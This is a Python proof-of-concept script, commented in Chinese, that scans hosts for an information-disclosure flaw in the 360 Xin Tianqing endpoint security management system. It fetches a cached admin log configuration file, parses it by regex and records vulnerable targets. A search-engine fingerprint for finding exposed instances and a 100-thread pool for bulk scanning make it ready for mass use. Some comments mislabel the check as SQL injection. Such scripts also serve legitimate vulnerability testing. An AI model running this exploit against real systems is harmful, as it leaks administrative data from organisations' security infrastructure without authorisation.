# 360 新天擎终端安全管理系统信息泄露漏洞
# title="360新天擎"
import argparse, requests, os, sys, re  # 导入所需的库
from multiprocessing.dummy import Pool  # 导入线程池以支持并发处理

# 禁用HTTPS请求的警告信息
requests.packages.urllib3.disable_warnings()


def banner():
    # 打印横幅信息，包含作者、日期和版本
    test = """   
██████╗  ██████╗  ██████╗ ██╗  ██╗████████╗ ██████╗         
╚════██╗██╔════╝ ██╔═████╗╚██╗██╔╝╚══██╔══╝██╔═══██╗        
 █████╔╝███████╗ ██║██╔██║ ╚███╔╝    ██║   ██║   ██║        
 ╚═══██╗██╔═══██╗████╔╝██║ ██╔██╗    ██║   ██║▄▄ ██║        
██████╔╝╚██████╔╝╚██████╔╝██╔╝ ██╗   ██║   ╚██████╔╝  
                                   author:MOYV  
                                   date:2024/09/03  
                                   version:1.0  
"""
    print(test)  # 打印横幅


def poc(target):
    # 漏洞检测函数，接受目标URL
    payload = '/runtime/admin_log_conf.cache'  # 漏洞利用的路径
    headers = {
        # 设置请求头，模拟浏览器请求
        'User-Agent': 'Mozilla/5.0(Windows NT 10.0;Win64;X64;rv:128.0)Gecko/20100101 Firefox/128.0'
    }

    try:
        # 发送请求到目标URL，检查其可达性
        res1 = requests.get(url=target, verify=False)
        if res1.status_code == 200:  # 如果请求成功
            # 发送请求到目标URL加上payload，检查是否存在信息泄露
            res2 = requests.get(url=target + payload, headers=headers, timeout=10, verify=False)
            # 使用正则表达式查找可能含有敏感信息的内容
            content = re.findall(r's:12:"(.*?)";', res2.text, re.S)
            # 检查内容中是否包含'/login/login'
            if '/login/login' in content:
                print(f"[+]{target}存在信息泄露")  # 输出检测到信息泄露的结果
                # 将结果写入文件
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在信息泄露\n")
            else:
                print(f"[-]{target}不存在信息泄露")  # 输出未检测到信息泄露的结果
    except:
        print(f"[!]{target}可能存在问题，请手动测试")  # 捕获异常并提示可能的问题


def main():
    # 主程序
    banner()  # 打印程序横幅信息
    url_list = []  # 创建URL列表
    # 设置命令行参数解析
    parse = argparse.ArgumentParser(description="360新天擎终端安全管理系统信息泄露漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")  # URL参数
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")  # URL文件参数
    args = parse.parse_args()  # 解析参数

    # 根据用户输入的参数选择执行方式
    if args.url and not args.file:  # 当输入URL时
        poc(args.url)  # 进行单个URL的SQL注入检测
    elif not args.url and args.file:  # 当输入文件时
        url_list = []  # 初始化URL列表
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():  # 读取文件中的每一行
                url_list.append(url.strip().replace("\n", ""))  # 去掉换行符并添加到列表
        mp = Pool(100)  # 创建一个包含100个线程的线程池
        mp.map(poc, url_list)  # 并发执行SQL注入检测
        mp.close()  # 关闭线程池
        mp.join()  # 等待所有线程完成
    else:
        # 提示用户正确的用法
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()  # 执行主函数